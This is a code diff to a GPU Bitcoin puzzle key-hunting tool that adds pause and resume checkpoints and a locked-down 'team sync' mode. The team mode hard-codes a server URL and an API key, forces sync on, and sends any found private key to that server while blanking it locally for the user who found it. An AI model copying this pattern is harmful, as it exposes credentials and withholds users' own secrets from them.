@@ -142,6 +142,7 @@ SYNC_CONFIG = {
     'auto_sync_interval': 90,  # 30 seconds for real-time team coordination
     'last_sync': None,
     'sync_in_progress': False,
+    'is_master': False,  # Team members only upload to server; master sees full key details
 }
 
 # Puzzle presets with target addresses
@@ -520,7 +521,22 @@ class ProcessManager:
                         # Parse completion percentage [C: 13.916016 %]
                         completion_match = re.search(r'\[C:\s*(\d+\.?\d*)\s*%\]', line)
                         if completion_match:
-                            self.processes[process_id]['completion'] = float(completion_match.group(1))
+                            new_completion = float(completion_match.group(1))
+                            old_completion = self.processes[process_id].get('completion', 0)
+                            self.processes[process_id]['completion'] = new_completion
+
+                            # Save progress at 5% intervals for cloud sync
+                            last_saved_pct = self.processes[process_id].get('last_saved_pct', 0)
+                            if new_completion >= last_saved_pct + 5:
+                                self.processes[process_id]['last_saved_pct'] = int(new_completion / 5) * 5
+                                # Save progress to database (will be synced to cloud)
+                                self._save_scan_progress(
+                                    self.processes[process_id]['puzzle'],
+                                    self.processes[process_id]['start'],
+                                    self.processes[process_id]['end'],
+                                    self.processes[process_id]['keys_checked'],
+                                    new_completion
+                                )
 
                         # KEY FOUND DETECTION - Check for actual key match indicators
                         # Be specific to avoid false positives from "MAX FOUND" or "OUTPUT FILE"
@@ -573,8 +589,62 @@ class ProcessManager:
                 # If this was a skipped block, remove it from skipped_blocks table
                 self._clear_skipped_block(puzzle, start)
 
-    def stop_mining(self, process_id):
-        """Stop a mining process"""
+    def pause_mining(self, process_id):
+        """Pause a mining process and save checkpoint for later resume"""
+        with self.lock:
+            if process_id not in self.processes:
+                return {'error': 'Process not found'}
+
+            proc_info = self.processes[process_id]
+            process = proc_info['process']
+
+            if proc_info['status'] == 'running':
+                try:
+                    process.terminate()
+                    process.wait(timeout=5)
+                except subprocess.TimeoutExpired:
+                    process.kill()
+                except:
+                    pass
+
+                proc_info['status'] = 'paused'
+
+                # Release GPU
+                gpu_id = proc_info.get('gpu_id')
+                if gpu_id is not None:
+                    mark_gpu_in_use(gpu_id, False)
+                    if process_id in GPU_CONFIG['gpu_assignments']:
+                        del GPU_CONFIG['gpu_assignments'][process_id]
+
+                # Save progress to database (partial completion)
+                self._save_scan_progress(
+                    proc_info['puzzle'],
+                    proc_info['start'],
+                    proc_info['end'],
+                    proc_info['keys_checked'],
+                    proc_info.get('completion', 0)
+                )
+
+                # ALWAYS save checkpoint when pausing
+                self._save_checkpoint(
+                    proc_info['puzzle'],
+                    proc_info['start'],
+                    proc_info['end'],
+                    proc_info['keys_checked'],
+                    proc_info.get('completion', 0)
+                )
+
+                print(f"[ProcessManager] Process {process_id} paused - checkpoint saved at {proc_info.get('completion', 0):.2f}%")
+
+            return {
+                'status': 'paused',
+                'process_id': process_id,
+                'completion': proc_info.get('completion', 0),
+                'keys_checked': proc_info.get('keys_checked', 0)
+            }
+
+    def stop_mining(self, process_id, skip_checkpoint=False):
+        """Stop a mining process, optionally skipping checkpoint save"""
         with self.lock:
             if process_id not in self.processes:
                 return {'error': 'Process not found'}
@@ -613,14 +683,15 @@ class ProcessManager:
                     proc_info.get('completion', 0)
                 )
 
-                # Save checkpoint for resume
-                self._save_checkpoint(
-                    proc_info['puzzle'],
-                    proc_info['start'],
-                    proc_info['end'],
-                    proc_info['keys_checked'],
-                    proc_info.get('completion', 0)
-                )
+                # Save checkpoint for resume (unless skip_checkpoint is True)
+                if not skip_checkpoint:
+                    self._save_checkpoint(
+                        proc_info['puzzle'],
+                        proc_info['start'],
+                        proc_info['end'],
+                        proc_info['keys_checked'],
+                        proc_info.get('completion', 0)
+                    )
 
                 # Clear from skipped blocks if this was a queued rescan
                 self._clear_skipped_block(
@@ -793,44 +864,71 @@ class ProcessManager:
         if addr_match:
             pub_address = addr_match.group(1)
 
-        # Create found key record
+        # Check if this is master or team instance
+        is_master = SYNC_CONFIG.get('is_master', False)
+
+        # Create found key record (for master, include full details; for team, hide private key)
         found_record = {
             'timestamp': timestamp,
             'puzzle': puzzle,
             'range_start': start,
             'range_end': end,
-            'line': line,
+            'line': line if is_master else "KEY FOUND - Details uploaded to server",
             'process_id': process_id,
-            'priv_hex': priv_hex,
-            'priv_wif': priv_wif,
+            'priv_hex': priv_hex if is_master else None,  # Hide from team
+            'priv_wif': priv_wif if is_master else None,  # Hide from team
             'pub_address': pub_address
         }
         self.found_keys.append(found_record)
 
-        # Save to Found.txt file
+        # CRITICAL: Always upload to sync server FIRST
         try:
-            found_file = os.path.join(DB_DIR, 'Found.txt')
-            with open(found_file, 'a') as f:
-                f.write(f"\n{'='*60}\n")
-                f.write(f"KEY FOUND! - {timestamp}\n")
-                f.write(f"{'='*60}\n")
-                f.write(f"Puzzle: {puzzle}\n")
-                f.write(f"Range: {start} - {end}\n")
-                if pub_address:
-                    f.write(f"Address: {pub_address}\n")
-                if priv_hex:
-                    f.write(f"Private Key (HEX): {priv_hex}\n")
-                if priv_wif:
-                    f.write(f"Private Key (WIF): {priv_wif}\n")
-                f.write(f"Raw Output: {line}\n")
-                f.write(f"{'='*60}\n\n")
-            print(f"KEY FOUND! Saved to Found.txt")
-            if priv_hex:
-                print(f"  Private Key (HEX): {priv_hex}")
-            if priv_wif:
-                print(f"  Private Key (WIF): {priv_wif}")
+            if SYNC_CONFIG.get('enabled') and SYNC_CONFIG.get('server_url'):
+                print(f"Uploading found key to sync server...")
+                upload_result = sync_upload_found_key(
+                    puzzle=puzzle,
+                    priv_hex=priv_hex,
+                    priv_wif=priv_wif,
+                    pub_address=pub_address,
+                    block_start=start,
+                    block_end=end,
+                    raw_output=line
+                )
+                if upload_result.get('status') == 'ok':
+                    print(f"Found key uploaded to server successfully!")
+                else:
+                    print(f"Warning: Failed to upload found key: {upload_result.get('message')}")
         except Exception as e:
-            print(f"Error saving found key: {e}")
+            print(f"Error uploading found key to server: {e}")
+
+        # Only save to Found.txt if this is the MASTER instance
+        if is_master:
+            try:
+                found_file = os.path.join(DB_DIR, 'Found.txt')
+                with open(found_file, 'a') as f:
+                    f.write(f"\n{'='*60}\n")
+                    f.write(f"KEY FOUND! - {timestamp}\n")
+                    f.write(f"{'='*60}\n")
+                    f.write(f"Puzzle: {puzzle}\n")
+                    f.write(f"Range: {start} - {end}\n")
+                    if pub_address:
+                        f.write(f"Address: {pub_address}\n")
+                    if priv_hex:
+                        f.write(f"Private Key (HEX): {priv_hex}\n")
+                    if priv_wif:
+                        f.write(f"Private Key (WIF): {priv_wif}\n")
+                    f.write(f"Raw Output: {line}\n")
+                    f.write(f"{'='*60}\n\n")
+                print(f"KEY FOUND! Saved to Found.txt")
+                if priv_hex:
+                    print(f"  Private Key (HEX): {priv_hex}")
+                if priv_wif:
+                    print(f"  Private Key (WIF): {priv_wif}")
+            except Exception as e:
+                print(f"Error saving found key: {e}")
+        else:
+            # Team member - just acknowledge the find
+            print(f"KEY FOUND! Details uploaded to master server.")
 
         # Save to database
         try:
@@ -1624,6 +1722,58 @@ def get_checkpoints(puzzle_num):
         return checkpoints
     except Exception as e:
         return {'error': str(e)}
+
+
+def delete_checkpoint(puzzle_num, resume_position):
+    """Delete a checkpoint from the database"""
+    try:
+        db_path = os.path.join(DB_DIR, f'scan_data_puzzle_{puzzle_num}.db')
+        if not os.path.exists(db_path):
+            return {'status': 'error', 'message': 'Database not found'}
+
+        conn = sqlite3.connect(db_path)
+        cursor = conn.cursor()
+
+        cursor.execute('DELETE FROM checkpoints WHERE resume_position = ?', (resume_position,))
+        deleted = cursor.rowcount
+
+        conn.commit()
+        conn.close()
+
+        if deleted > 0:
+            print(f"Deleted checkpoint at {resume_position[:12]}...")
+            return {'status': 'ok', 'deleted': deleted}
+        else:
+            return {'status': 'error', 'message': 'Checkpoint not found'}
+    except Exception as e:
+        return {'status': 'error', 'message': str(e)}
+
+
+def delete_partial_scan(puzzle_num, block_start):
+    """Delete a partial scan from the database (my_scanned table)"""
+    try:
+        db_path = os.path.join(DB_DIR, f'scan_data_puzzle_{puzzle_num}.db')
+        if not os.path.exists(db_path):
+            return {'status': 'error', 'message': 'Database not found'}
+
+        conn = sqlite3.connect(db_path)
+        cursor = conn.cursor()
+
+        # Delete from my_scanned table
+        cursor.execute('DELETE FROM my_scanned WHERE block_start = ?', (block_start,))
+        deleted_scans = cursor.rowcount
+
+        # Also delete any associated checkpoints
+        cursor.execute('DELETE FROM checkpoints WHERE block_start = ?', (block_start,))
+        deleted_checkpoints = cursor.rowcount
+
+        conn.commit()
+        conn.close()
+
+        print(f"Deleted partial scan at {block_start[:12]}... ({deleted_scans} scan records, {deleted_checkpoints} checkpoints)")
+        return {'status': 'ok', 'deleted_scans': deleted_scans, 'deleted_checkpoints': deleted_checkpoints}
+    except Exception as e:
+        return {'status': 'error', 'message': str(e)}
 
 
 def generate_heatmap_data(puzzle_num, resolution=100):
@@ -2913,55 +3063,48 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                 </div>
 
                 <div class="panel">
-                    <h3 style="color: #888;">Checkpoints</h3>
-                    <div id="checkpoint-list" style="font-size: 9px; max-height: 150px; overflow-y: auto;">
-                        Click to load checkpoints
+                    <h3 style="color: #ffaa00;">⏸ Paused Scans</h3>
+                    <div id="checkpoint-list" style="font-size: 9px; max-height: 180px; overflow-y: auto;">
+                        <div style="color: #888; text-align: center; padding: 10px;">Click refresh to load</div>
                     </div>
-                    <button onclick="loadCheckpoints()" style="width: 100%; margin-top: 5px; font-size: 10px;">Load Checkpoints</button>
+                    <button onclick="loadCheckpoints()" style="width: 100%; margin-top: 5px; font-size: 10px;">🔄 Refresh Paused Scans</button>
                 </div>
 
                 <div class="panel" id="sync-panel">
                     <h3 style="color: #00d4ff;">
                         <span style="display: inline-flex; align-items: center; gap: 6px;">
-                            Cloud Sync
-                            <span id="sync-status-dot" style="width: 8px; height: 8px; border-radius: 50%; background: #666;" title="Not configured"></span>
+                            Team Sync
+                            <span id="sync-status-dot" style="width: 8px; height: 8px; border-radius: 50%; background: #666;" title="Connecting..."></span>
                         </span>
                     </h3>
                     <div id="sync-status" style="font-size: 10px; color: #888; margin-bottom: 8px;">
-                        Status: <span id="sync-status-text">Not configured</span>
+                        Status: <span id="sync-status-text">Connecting...</span>
                     </div>
-                    <div style="font-size: 10px; margin-bottom: 8px;">
-                        <label style="color: #888;">Server URL:</label>
-                        <input type="text" id="sync-server-url" placeholder="https://client.intercomserviceslondon.co.uk/wp-json/keyhunt/v1" style="width: 100%; margin: 3px 0; font-size: 10px; padding: 4px;">
-                        <label style="color: #888;">API Key:</label>
-                        <input type="password" id="sync-api-key" placeholder="Your API key" style="width: 100%; margin: 3px 0; font-size: 10px; padding: 4px;">
-                        <label style="color: #888;">Client Name:</label>
-                        <input type="text" id="sync-client-name" placeholder="My-PC" style="width: 100%; margin: 3px 0; font-size: 10px; padding: 4px;">
-                        <div style="margin-top: 5px;">
-                            <label class="checkbox-label" style="font-size: 10px;">
-                                <input type="checkbox" id="sync-enabled"> Enable Sync
-                            </label>
+                    <div style="font-size: 10px; margin-bottom: 8px; color: #888;">
+                        <div style="margin-bottom: 5px;">
+                            <span style="color: #666;">Client ID:</span>
+                            <span id="sync-client-id" style="color: #00d4ff; font-family: monospace;">-</span>
                         </div>
-                        <div style="margin-top: 5px;">
-                            <label style="color: #888;">Auto-sync interval:</label>
-                            <select id="sync-interval" style="width: 100%; font-size: 10px; padding: 4px;">
-                                <option value="0">Manual only</option>
-                                <option value="60">1 minute</option>
-                                <option value="300" selected>5 minutes</option>
-                                <option value="600">10 minutes</option>
-                                <option value="1800">30 minutes</option>
-                            </select>
+                        <div style="margin-bottom: 5px;">
+                            <span style="color: #666;">Last Sync:</span>
+                            <span id="sync-last-time" style="color: #aaa;">Never</span>
                         </div>
-                    </div>
-                    <div style="display: flex; gap: 5px; margin-bottom: 8px;">
-                        <button onclick="testSyncConnection()" style="flex: 1; font-size: 10px;">Test</button>
-                        <button onclick="saveSyncConfig()" class="success" style="flex: 1; font-size: 10px;">Save</button>
+                        <div>
+                            <span style="color: #666;">Auto-sync:</span>
+                            <span id="sync-interval-display" style="color: #00ff88;">Every 90s</span>
+                        </div>
                     </div>
                     <div style="display: flex; gap: 5px;">
                         <button onclick="syncNow()" class="warning" style="flex: 1; font-size: 10px;" id="sync-now-btn">Sync Now</button>
                         <button onclick="loadSyncStats()" style="flex: 1; font-size: 10px;">Stats</button>
                     </div>
                     <div id="sync-results" style="font-size: 9px; color: #888; margin-top: 8px; max-height: 100px; overflow-y: auto;"></div>
+                    <!-- Hidden inputs for compatibility with existing JS -->
+                    <input type="hidden" id="sync-server-url">
+                    <input type="hidden" id="sync-api-key">
+                    <input type="hidden" id="sync-client-name">
+                    <input type="hidden" id="sync-enabled" value="true">
+                    <input type="hidden" id="sync-interval" value="90">
                 </div>
             </div>
         </div>
@@ -3337,16 +3480,22 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                 const data = await response.json();
 
                 if (!data || data.length === 0) {
-                    container.innerHTML = '<div style="color: #888;">No checkpoints found</div>';
+                    container.innerHTML = '<div style="color: #888;">No paused scans</div>';
                     return;
                 }
 
                 container.innerHTML = data.slice(0, 10).map(cp => `
-                    <div style="background: rgba(255,255,255,0.05); padding: 4px; margin-bottom: 4px; border-radius: 3px;">
-                        <div style="font-family: monospace; font-size: 8px;">0x${cp.resume_position?.substring(0, 12)}...</div>
-                        <div style="display: flex; justify-content: space-between; align-items: center;">
-                            <span style="color: #888; font-size: 8px;">${cp.completion_pct?.toFixed(1)}%</span>
-                            <button onclick="resumeFromCheckpoint('${cp.resume_position}', '${cp.block_end}')" style="font-size: 8px; padding: 2px 6px;">Resume</button>
+                    <div style="background: rgba(255,170,0,0.1); padding: 6px; margin-bottom: 4px; border-radius: 3px; border-left: 2px solid #ffaa00;">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 3px;">
+                            <span style="font-family: monospace; font-size: 8px; color: #00d4ff;">0x${cp.resume_position?.substring(0, 10)}...</span>
+                            <span style="color: #ffaa00; font-size: 9px; font-weight: bold;">${cp.completion_pct?.toFixed(1)}%</span>
+                        </div>
+                        <div style="font-size: 7px; color: #888; margin-bottom: 3px;">
+                            ${formatNumber(cp.keys_checked)} keys | ${cp.saved_at?.substring(5, 16) || 'N/A'}
+                        </div>
+                        <div style="display: flex; gap: 3px;">
+                            <button onclick="resumeFromCheckpoint('${cp.resume_position}', '${cp.block_end}')" class="success" style="flex: 1; font-size: 8px; padding: 2px 4px;">▶ Resume</button>
+                            <button onclick="deleteCheckpoint('${cp.resume_position}')" class="danger" style="font-size: 8px; padding: 2px 4px;">🗑</button>
                         </div>
                     </div>
                 `).join('');
@@ -3357,6 +3506,51 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
 
         async function resumeFromCheckpoint(resumePos, endPos) {
             await startCellMining(resumePos, endPos);
+        }
+
+        async function deleteCheckpoint(resumePos) {
+            if (!confirm('Delete this checkpoint? This cannot be undone.')) return;
+
+            try {
+                const response = await fetch('/api/checkpoint/delete', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ puzzle: currentPuzzle, resume_position: resumePos })
+                });
+                const result = await response.json();
+
+                if (result.status === 'ok') {
+                    showToast('Checkpoint deleted', 'success');
+                    loadCheckpoints();
+                } else {
+                    showToast(result.message || 'Failed to delete', 'error');
+                }
+            } catch (e) {
+                showToast('Error: ' + e.message, 'error');
+            }
+        }
+
+        async function deletePartialScan(blockStart) {
+            if (!confirm('Delete this partial scan and all associated checkpoints? This cannot be undone.')) return;
+
+            try {
+                const response = await fetch('/api/partial-scan/delete', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ puzzle: currentPuzzle, block_start: blockStart })
+                });
+                const result = await response.json();
+
+                if (result.status === 'ok') {
+                    showToast('Partial scan deleted', 'success');
+                    loadCheckpoints();
+                    loadGrid();
+                } else {
+                    showToast(result.message || 'Failed to delete', 'error');
+                }
+            } catch (e) {
+                showToast('Error: ' + e.message, 'error');
+            }
         }
 
         // Scheduler
@@ -4469,7 +4663,8 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                         <div style="display: flex; justify-content: space-between; margin-top: 4px;">
                             <span style="font-size: 9px; color: #888;">${(proc.completion || 0).toFixed(2)}%</span>
                             <button class="small" onclick="event.stopPropagation(); toggleSubBlockView(${pid})" title="Show sub-blocks">📊</button>
-                            <button class="danger small" onclick="event.stopPropagation(); stopProcess(${pid})">Stop</button>
+                            <button class="warning small" onclick="event.stopPropagation(); pauseProcess(${pid})" title="Pause and save checkpoint for later resume">⏸ Pause</button>
+                            <button class="danger small" onclick="event.stopPropagation(); stopProcess(${pid}, true)" title="Stop without saving checkpoint">⏹ Stop</button>
                         </div>
                         <div id="subblock-view-${pid}" style="display: none; margin-top: 8px;">
                             ${generateSubBlockGrid(proc.completion || 0)}
@@ -4479,10 +4674,37 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             `).join('');
         }
 
-        async function stopProcess(pid) {
-            await fetch(`/api/mine/stop/${pid}`, {method: 'POST'});
+        async function pauseProcess(pid) {
+            // Pause saves checkpoint for later resume
+            const response = await fetch(`/api/mine/pause/${pid}`, {method: 'POST'});
+            const result = await response.json();
+            if (result.status === 'paused') {
+                showToast('Process paused - checkpoint saved for resume', 'success');
+                loadCheckpoints();  // Refresh checkpoint list
+            }
             updateProcessList();
             loadGrid();
+        }
+
+        async function stopProcess(pid, skipCheckpoint = false) {
+            // Stop with option to skip checkpoint
+            const url = skipCheckpoint ? `/api/mine/stop/${pid}?skip_checkpoint=1` : `/api/mine/stop/${pid}`;
+            await fetch(url, {method: 'POST'});
+            updateProcessList();
+            loadGrid();
+        }
+
+        function showToast(message, type = 'info') {
+            const toast = document.createElement('div');
+            toast.style.cssText = `
+                position: fixed; bottom: 20px; right: 20px; padding: 12px 20px;
+                background: ${type === 'success' ? '#00ff88' : type === 'error' ? '#ff4444' : '#00d4ff'};
+                color: #000; border-radius: 8px; font-size: 12px; z-index: 10000;
+                animation: slideIn 0.3s ease;
+            `;
+            toast.textContent = message;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
         }
 
         function loadProcessBlock(startHex, endHex) {
@@ -4794,11 +5016,29 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                 const data = await response.json();
                 if (data.status === 'ok') {
                     syncConfig = data;
-                    document.getElementById('sync-server-url').value = data.server_url || '';
-                    document.getElementById('sync-api-key').value = data.api_key ? '********' : '';
-                    document.getElementById('sync-client-name').value = data.client_name || '';
-                    document.getElementById('sync-enabled').checked = data.enabled;
-                    document.getElementById('sync-interval').value = data.auto_sync_interval || 300;
+
+                    // Update Team Sync panel display (read-only for team version)
+                    const clientIdEl = document.getElementById('sync-client-id');
+                    const lastTimeEl = document.getElementById('sync-last-time');
+                    const intervalEl = document.getElementById('sync-interval-display');
+
+                    if (clientIdEl) clientIdEl.textContent = data.client_id || 'Generating...';
+                    if (lastTimeEl) lastTimeEl.textContent = data.last_sync ? new Date(data.last_sync).toLocaleTimeString() : 'Never';
+                    if (intervalEl) intervalEl.textContent = 'Every ' + (data.auto_sync_interval || 90) + 's';
+
+                    // Hidden inputs for compatibility
+                    const serverUrlEl = document.getElementById('sync-server-url');
+                    const apiKeyEl = document.getElementById('sync-api-key');
+                    const clientNameEl = document.getElementById('sync-client-name');
+                    const enabledEl = document.getElementById('sync-enabled');
+                    const intervalInputEl = document.getElementById('sync-interval');
+
+                    if (serverUrlEl) serverUrlEl.value = data.server_url || '';
+                    if (apiKeyEl) apiKeyEl.value = data.api_key || '';
+                    if (clientNameEl) clientNameEl.value = data.client_name || '';
+                    if (enabledEl) enabledEl.value = data.enabled ? 'true' : 'false';
+                    if (intervalInputEl) intervalInputEl.value = data.auto_sync_interval || 90;
+
                     updateSyncStatusUI(data);
 
                     // Start auto-sync if enabled
@@ -4814,27 +5054,33 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
         function updateSyncStatusUI(config) {
             const dot = document.getElementById('sync-status-dot');
             const text = document.getElementById('sync-status-text');
+            const lastTimeEl = document.getElementById('sync-last-time');
 
             if (!config.server_url) {
-                dot.style.background = '#666';
-                dot.title = 'Not configured';
-                text.textContent = 'Not configured';
-                text.style.color = '#888';
-            } else if (!config.enabled) {
                 dot.style.background = '#ff9900';
-                dot.title = 'Disabled';
-                text.textContent = 'Disabled';
+                dot.title = 'Connecting...';
+                text.textContent = 'Connecting...';
                 text.style.color = '#ff9900';
             } else if (config.sync_in_progress) {
                 dot.style.background = '#00d4ff';
                 dot.title = 'Syncing...';
                 text.textContent = 'Syncing...';
                 text.style.color = '#00d4ff';
-            } else {
+            } else if (config.enabled) {
                 dot.style.background = '#00ff88';
                 dot.title = 'Connected';
-                text.textContent = config.last_sync ? 'Last: ' + new Date(config.last_sync).toLocaleTimeString() : 'Ready';
+                text.textContent = 'Connected';
                 text.style.color = '#00ff88';
+            } else {
+                dot.style.background = '#ff9900';
+                dot.title = 'Reconnecting...';
+                text.textContent = 'Reconnecting...';
+                text.style.color = '#ff9900';
+            }
+
+            // Update last sync time
+            if (lastTimeEl && config.last_sync) {
+                lastTimeEl.textContent = new Date(config.last_sync).toLocaleTimeString();
             }
         }
 
@@ -4872,45 +5118,12 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
         }
 
         async function saveSyncConfig() {
-            const serverUrl = document.getElementById('sync-server-url').value;
-            const apiKey = document.getElementById('sync-api-key').value;
-            const clientName = document.getElementById('sync-client-name').value;
-            const enabled = document.getElementById('sync-enabled').checked;
-            const interval = parseInt(document.getElementById('sync-interval').value);
+            // Team version: Sync settings are managed automatically
             const resultsDiv = document.getElementById('sync-results');
-
-            resultsDiv.innerHTML = '<span style="color: #00d4ff;">Saving configuration...</span>';
-
-            try {
-                const response = await fetch('/api/sync/config', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        server_url: serverUrl,
-                        api_key: apiKey !== '********' ? apiKey : null,
-                        client_name: clientName,
-                        enabled: enabled,
-                        auto_sync_interval: interval
-                    })
-                });
-                const data = await response.json();
-
-                if (data.status === 'ok') {
-                    resultsDiv.innerHTML = '<span style="color: #00ff88;">Configuration saved!</span>';
-                    syncConfig = { ...syncConfig, server_url: serverUrl, enabled, client_name: clientName, auto_sync_interval: interval };
-                    updateSyncStatusUI(data);
-
-                    // Update auto-sync
-                    if (syncInterval) clearInterval(syncInterval);
-                    if (enabled && interval > 0) {
-                        startAutoSync(interval);
-                    }
-                } else {
-                    resultsDiv.innerHTML = '<span style="color: #ff4444;">Failed: ' + (data.message || 'Unknown error') + '</span>';
-                }
-            } catch (e) {
-                resultsDiv.innerHTML = '<span style="color: #ff4444;">Error: ' + e.message + '</span>';
+            if (resultsDiv) {
+                resultsDiv.innerHTML = '<span style="color: #ff9900;">Sync settings are managed automatically for team members.</span>';
             }
+            console.log('Team version: Sync settings cannot be modified manually.');
         }
 
         function startAutoSync(intervalSeconds) {
@@ -5028,17 +5241,73 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
 # ============= CLOUD SYNC FUNCTIONS =============
 
 def sync_load_config():
-    """Load sync configuration from file"""
+    """Load sync configuration from file - Auto-setup for team version"""
+    import secrets
+    import socket
+
     config_path = os.path.join(DB_DIR, 'sync_config.json')
+    config_changed = False
+
     if os.path.exists(config_path):
         try:
             with open(config_path, 'r') as f:
                 config = json.load(f)
                 SYNC_CONFIG.update(config)
-                return True
         except Exception as e:
             print(f"Error loading sync config: {e}")
-    return False
+
+    # TEAM VERSION AUTO-SETUP: Always ensure sync is properly configured
+    # Hardcoded server URL and API key for team members
+    TEAM_SERVER_URL = "https://client.intercomserviceslondon.co.uk/wp-json/keyhunt/v1"
+    TEAM_API_KEY = "gtHtVP99sNkrveHjfXgLJWijv7nmVd9j"
+
+    # Auto-set server URL if not set or different
+    if not SYNC_CONFIG.get('server_url') or SYNC_CONFIG['server_url'] != TEAM_SERVER_URL:
+        SYNC_CONFIG['server_url'] = TEAM_SERVER_URL
+        config_changed = True
+
+    # Auto-set API key if not set
+    if not SYNC_CONFIG.get('api_key') or SYNC_CONFIG['api_key'] != TEAM_API_KEY:
+        SYNC_CONFIG['api_key'] = TEAM_API_KEY
+        config_changed = True
+
+    # Auto-generate client_id if not set
+    if not SYNC_CONFIG.get('client_id'):
+        SYNC_CONFIG['client_id'] = secrets.token_hex(4)  # 8 character random ID
+        config_changed = True
+        print(f"[TEAM SYNC] Generated new client ID: {SYNC_CONFIG['client_id']}")
+
+    # Auto-set client_name based on hostname if not set
+    if not SYNC_CONFIG.get('client_name'):
+        try:
+            hostname = socket.gethostname()
+            SYNC_CONFIG['client_name'] = f"Team-{hostname[:20]}"
+        except:
+            SYNC_CONFIG['client_name'] = f"Team-{SYNC_CONFIG['client_id']}"
+        config_changed = True
+
+    # Always enable sync for team version
+    if not SYNC_CONFIG.get('enabled'):
+        SYNC_CONFIG['enabled'] = True
+        config_changed = True
+
+    # Set auto-sync interval to 90 seconds
+    if SYNC_CONFIG.get('auto_sync_interval') != 90:
+        SYNC_CONFIG['auto_sync_interval'] = 90
+        config_changed = True
+
+    # Ensure is_master is False for team version
+    if SYNC_CONFIG.get('is_master') != False:
+        SYNC_CONFIG['is_master'] = False
+        config_changed = True
+
+    # Save config if anything changed
+    if config_changed:
+        sync_save_config()
+        print(f"[TEAM SYNC] Auto-configured sync settings for team member")
+        print(f"[TEAM SYNC] Client ID: {SYNC_CONFIG['client_id']}, Name: {SYNC_CONFIG['client_name']}")
+
+    return True
 
 def sync_save_config():
     """Save sync configuration to file"""
@@ -5052,6 +5321,7 @@ def sync_save_config():
                 'client_id': SYNC_CONFIG['client_id'],
                 'client_name': SYNC_CONFIG['client_name'],
                 'auto_sync_interval': SYNC_CONFIG['auto_sync_interval'],
+                'is_master': SYNC_CONFIG.get('is_master', False),
             }, f, indent=2)
         return True
     except Exception as e:
@@ -5236,10 +5506,12 @@ def sync_full_sync(puzzle_num):
         pool_blocks = []
 
         for block in blocks.get('mine', []):
+            keys_checked = block.get('keys', 0) or 0
             my_blocks.append({
                 'start': block['start'],
                 'end': block['end'],
-                'keys_checked': block.get('keys', 0),
+                'keys_checked': keys_checked,
+                'keys_in_block': keys_checked,  # Use actual keys checked, not full range
                 'completion_pct': 100,
                 'scanned_at': block.get('time', '')
             })
@@ -5625,10 +5897,21 @@ class VisualizerHandler(SimpleHTTPRequestHandler):
             result = process_manager.start_mining(puzzle, start, end, use_gpu, use_filter)
             self.send_json(result)
 
+        elif path.startswith('/api/mine/pause/'):
+            # Pause process and save checkpoint for later resume
+            try:
+                pid = int(path.split('/')[-1])
+                result = process_manager.pause_mining(pid)
+                self.send_json(result)
+            except ValueError:
+                self.send_json({'error': 'Invalid process ID'})
+
         elif path.startswith('/api/mine/stop/'):
             try:
                 pid = int(path.split('/')[-1])
-                result = process_manager.stop_mining(pid)
+                # Check if skip_checkpoint is requested
+                skip_checkpoint = 'skip_checkpoint=1' in (self.path.split('?')[1] if '?' in self.path else '')
+                result = process_manager.stop_mining(pid, skip_checkpoint=skip_checkpoint)
                 self.send_json(result)
             except ValueError:
                 self.send_json({'error': 'Invalid process ID'})
@@ -5811,6 +6094,31 @@ class VisualizerHandler(SimpleHTTPRequestHandler):
                 self.send_json(result)
             except Exception as e:
                 self.send_json({'error': str(e)})
+
+        # ============= CHECKPOINT MANAGEMENT ENDPOINTS =============
+        elif path == '/api/checkpoint/delete':
+            # Delete a checkpoint
+            puzzle = data.get('puzzle')
+            resume_position = data.get('resume_position')
+
+            if not puzzle or not resume_position:
+                self.send_json({'error': 'Missing puzzle or resume_position'})
+                return
+
+            result = delete_checkpoint(puzzle, resume_position)
+            self.send_json(result)
+
+        elif path == '/api/partial-scan/delete':
+            # Delete a partial scan record (from my_scanned table)
+            puzzle = data.get('puzzle')
+            block_start = data.get('block_start')
+
+            if not puzzle or not block_start:
+                self.send_json({'error': 'Missing puzzle or block_start'})
+                return
+
+            result = delete_partial_scan(puzzle, block_start)
+            self.send_json(result)
 
         # ============= SYNC POST ENDPOINTS =============
         elif path == '/api/sync/test':
